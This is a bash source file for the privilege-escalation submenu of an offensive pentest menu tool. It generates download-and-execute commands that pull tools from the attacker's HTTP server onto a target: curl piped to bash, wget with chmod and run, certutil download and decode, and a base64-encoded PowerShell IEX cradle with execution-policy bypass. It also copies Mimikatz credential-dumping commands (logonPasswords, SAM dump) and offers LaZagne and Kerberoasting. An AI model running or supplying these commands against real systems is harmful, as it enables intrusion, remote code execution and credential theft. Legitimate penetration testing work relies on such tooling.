#!/bin/bash
####################### #### ## #  #
# >> pwnMENU - privesc
################### #### ## #  #    #
#
# >> this file contains the "privesc" sub menu and all it's functions

menu_privesc()
{
	if [ "$target_os" == "linux" ]; then
        lines=7
        menu="$(pfx -n "LINPEAS") linPEAS (enumeration)\n<small>linPEAS scans linux targets for available known privesc methods</small>$lb$(pfx -n "LSE") LSE - Linux Smart Enumeration (enumeration)\n<small>LSE scans linux targets for available known privesc methods</small>$lb$(pfx -n "LINENUM") LinEnum (enumeration)\n<small>LinEnum scans linux targets for available known privesc methods</small>$lb$(pfx -n "SUID3NM") suid3num (enumeration)\n<small>suid3num checks suid binaries against the GTFObins lists for escalation techniques</small>$lb$lbrk$lb$(pfx -n "DOWNLOAD") download method\n<small>(current = $dl_method) sets remote target download method</small>$lb$(pfx -n "BACK") go back..."
    elif [ "$target_os" == "windows" ]; then
        lines=9
        menu="$(pfx -n "WINPEAS") winPEAS (enumeration)\n<small>winPEAS scans windows targets for available known privesc methods</small>$lb$(pfx -n "SEATBELT") Seatbelt (enumeration)\n<small>Seatbelt scans windows targets for available known privesc methods</small>$lb$(pfx -n "PWRVIEW") PowerView (enumeration)\n<small>PowerView helps with Active Directory enumeration (powershell)</small>$lb$(pfx -n "POWERUP") PowerUp (privesc)\n<small>PowerUp attempts to execute known privesc methods (powershell)</small>$lb$(pfx -n "INVKER") Invoke-Kerberoast (privesc)\n<small>Invoke-Kerberoast attempts to extract SPNs from kerberos for cracking (powershell)</small>$lb$(pfx -n "LAZAGNE") LaZagne (password search)\n<small>LaZagne attempts to find passwords stored in many places</small>$lb$(pfx -n "MIMIKATZ") control Mimikatz (kerberos attacks)\n<small>Mimikatz is used to grab kerberos password hashes for AD privesc</small>$lb$lbrk$lb$(pfx -n "DOWNLOAD") download method\n<small>(current = $dl_method) sets remote target download method</small>$lb$(pfx -n "BACK") go back..."
    fi
	msg="pwnMENU > <b>privesc</b>\n<small>tools to help you escalate (or laterally move) through the target!\n\n<b>NOTE:</b> this section requires the HTTPD to be running (started via this menu!)</small>"
	result=$(echo -e "$menu" | rf "PRIVESC" "$msg" $lines)
    result=$(echo $result | awk '{print $1}')
	case $result in
		"LINPEAS")
            get_dl_privesc "linpeas.sh" "linpeas.sh"
            ;;
		"LSE")
            get_dl_privesc "lse.sh" "lse.sh"
            ;;
		"LINENUM")
            get_dl_privesc "linEnum.sh" "linEnum.sh"
            ;;
		"SUID3NM")
            get_dl_privesc "suid3num.py" "suid3num.py"
            ;;
		"WINPEAS")
            msg="pwnMENU > PRIVESC > <b>WINPEAS</b>\n<small>which variant of winPEAS would you like to use?</small>"
            menu="$(pfx "BAT") winpeas.bat$lb$(pfx "X86") winPEASx86.exe$lb$(pfx "X64") winPEASx64.exe"
            result=$(echo -e "$menu" | rf "WINPEAS" "$msg" 3)
            result=$(echo $result | awk '{print $1}')
            case $result in
                "BAT")
                    get_dl_privesc "winpeas.bat" "winpeas.bat"
                    ;;
                "X86")
                    get_dl_privesc "winPEASx86.exe" "winPEASx86.exe"
                    ;;
                "X64")
                    get_dl_privesc "winPEASx64.exe" "winPEASx64.exe"
                    ;;
            esac
            ;;
		"SEATBELT")
            get_dl_privesc "Seatbelt.exe" "Seatbelt.exe"
            ;;
		"PWRVIEW")
            get_dl_privesc "PowerView.ps1" ""
            ;;
		"POWERUP")
            get_dl_privesc "PowerUp.ps1" "Invoke-AllChecks"
            ;;
		"SHARPUP")
            get_dl_privesc "SharpUp.exe" "SharpUp.exe"
            ;;
		"INVKER")
            get_dl_privesc "Invoke-Kerberoast.ps1" "Invoke-Kerberoast"
            ;;
		"LAZAGNE")
            get_dl_privesc "lazagne.exe" "lazagne.exe"
            ;;
		"RUBEUS")
			pe_win_rubeus
			;;
		"MIMIKATZ")
			pe_win_mimikatz
			;;
		"DOWNLOAD")
            if [ "$target_os" = "linux" ]; then
                msg="pwnMENU / privesc / <b>download</b>\n<small>select the download method to be used on the target system:\n\n<b>NOTE:</b> curl will not save data to the target, but will need to be re-downloaded to run again</small>"
                dl_methods="curl${lb}wget"
                dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
            elif [ "$target_os" = "windows" ]; then
                msg="pwnMENU / privesc / <b>download</b>\n<small>select the download method to be used on the target system:\n\n<b>NOTE:</b> certutil will only work for executables, powershell is preferred if available! (both methods are base64 encrypted!)</small>"
                dl_methods="certutil${lb}powershell"
                dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
			fi
			menu_privesc
			;;
		"BACK")
			main
			;;
	esac
}

get_dl_privesc()
{
    if [ "$httpd_status" == "offline" ]; then
        rf_msg "$(pfx -n "ERROR") the HTTPD server is not currently running."
    else
        if [ -f "$httpd_path/privesc/$1" ]; then
            payload="$(get_dl_method "$httpd_url/privesc/$1" "$2")"
            echo -ne $payload | xclip -sel clip
            rf_msg "$(pfx -n "INFO") $1 download command copied to the clipboard."
            exit 0
        else
            rf_msg "$(pfx -n "ERROR") $1 is not available (needs to be stored at $httpd_path/privesc/$1)."
        fi
    fi
    menu_privesc
}

get_dl_method()
{
    url="$1"
    file="$(echo "$url" | sed "s|$httpd_url/privesc/||g")"
    cmd="$2"
    if [ "$target_os" = "linux" ]; then
        if [ "$dl_method" == "curl" ]; then
            echo "curl $url | bash"
        elif [ "$dl_method" == "wget" ]; then
            echo "wget $url $file; chmod +x $file; ./$cmd"
        fi
    elif [ "$target_os" = "windows" ]; then
        if [ "$dl_method" == "certutil" ]; then
            rm $httpd_path/payload.b64
            base64 -w 0 $httpd_path/privesc/$file > $httpd_path/payload.b64
            echo "certutil -urlcache -split -f $httpd_url/payload.b64 payload.b64 & certutil -decode payload.b64 $file & $cmd"
        elif [ "$dl_method" == "powershell" ]; then
            initial=$(echo -n "IEX(IWR $url -UseBasicParsing); $cmd" | iconv -t UTF-16LE | base64 -w 0)
            payload="powershell -nop -ep bypass -enc $initial"
            echo "$payload"
        fi
    fi
}

pe_win_mimikatz()
{
	menu="privilege${lb}logonPasswords${lb}lsadump"
	result=$(echo -ne "$menu" | rf "MIMIKATZ" "$msg" 3)
	case $result in
		"logonPasswords")
			payload="sekurlsa::logonPasswords"
			;;
		"privilege")
			payload="privilege::debug"
			;;
		"lsadump")
			payload="lsadump::sam"
			;;
	esac
	echo -n $payload | xclip -sel clip
	bash -c "notify-send 'dmenu_pentest' 'mimikatz command copied to clipboard' -t 2"
}
